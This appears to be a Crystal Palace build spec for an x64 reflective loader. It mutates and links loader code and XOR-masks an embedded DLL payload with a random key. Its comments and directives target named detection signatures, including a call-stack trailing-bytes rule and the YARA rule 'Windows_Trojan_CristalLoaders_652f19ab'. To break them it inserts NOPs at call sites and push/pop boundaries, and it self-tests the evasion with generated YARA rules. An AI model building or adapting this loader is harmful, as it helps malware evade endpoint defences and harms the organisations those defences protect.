x64:
	
	load "../../build/loader.x64.o"        									# read the loader COFF
		make pic +gofirst +optimize +mutate +disco +regdance +blockparty +shatter		# BTF: full signature resilience cocktail

	load "../../build/stomp.x64.o"         									# read the stomp COFF
		merge
	load "../../build/cfg.x64.o"           										# read the cfg COFF
		merge

	run "../../crystal_palace/specs/services.spec"  				# run the services spec to merge the services PIC and resolve functions

	run "../../crystal_palace/specs/pico.spec"  						# run the pico spec to export the setup_hooks function and finalize the PIC
		link "pico"

	# ── Constant Blinding: limit magic pool so ised can target the scaffolding ──
	magic "0x7FFFFFFF, 0xD34DB33F, 0xCAFEBABE, 0xDEADC0DE"

	# ── ised: break content signatures around high-value instruction sequences ──
	# NOP sled after ror13 resolver calls - these are signature magnets
	pack $NOP "b" 0x90
	ised insert "call findModuleByHash" $NOP +safe
	ised insert "call findFunctionByHash" $NOP +safe
	# Break callsite_trailing_bytes pattern (defense_evasion_suspicious_call_stack_trailing_bytes)
	# A NOP at every CALL site means the bytes at each return address start with 0x90,
	# not 0x4883 (add rsp epilogue), so they cannot match 4883????c3909090909090*
	# CALL rel32 covers the DFR resolver dispatch; CALL r/m64 covers the actual
	# function dispatch (call rax / call rbx etc.) used by the DFR trampoline
	ised insert "CALL rel32" $NOP +safe
	ised insert "CALL r/m64" $NOP +safe

	# Split blocks at common prologue/epilogue patterns to fragment signature islands
	ised insert "CALL rel32" $NULL +split +last +after
	ised insert "MOV" "CALL rel32" $NULL +split +first +before

	# ── Break Windows_Trojan_CristalLoaders_652f19ab ($b1 / $b2) ──
	# The +disco DFR trampoline emits a 14-byte 6-push prologue ($b1) ending in
	# `sub rsp, 0x20`, and a 12-byte 6-pop epilogue ending in `call rax` ($b2).
	# Insert one NOP at the unique boundary of each so the contiguous byte
	# sequences never appear. +safe omitted intentionally: the existing
	# `CALL r/m64 +safe` line already runs and evidently skips disco callsites.
	ised insert "PUSH r64" "SUB r/m64, imm8" $NOP +before
	ised insert "POP r64"  "CALL r/m64"      $NOP +before

	# ── Yara rule generation: self-test signature resilience ──
	rule "" 10 3 10-16

	generate $KEY 128  																			# generate a random 128-byte key and assign it to the $KEY variable

	push $DLL
		xor $KEY    																					# xor the dll with the key
		preplen     																					# prepend its length
		link "dll"  																					# link it to the "dll" section

	push $KEY
		preplen      																					# prepend the key's length
		link "mask"  																					# link it to the "mask" section

	
	export  																								# export the final pic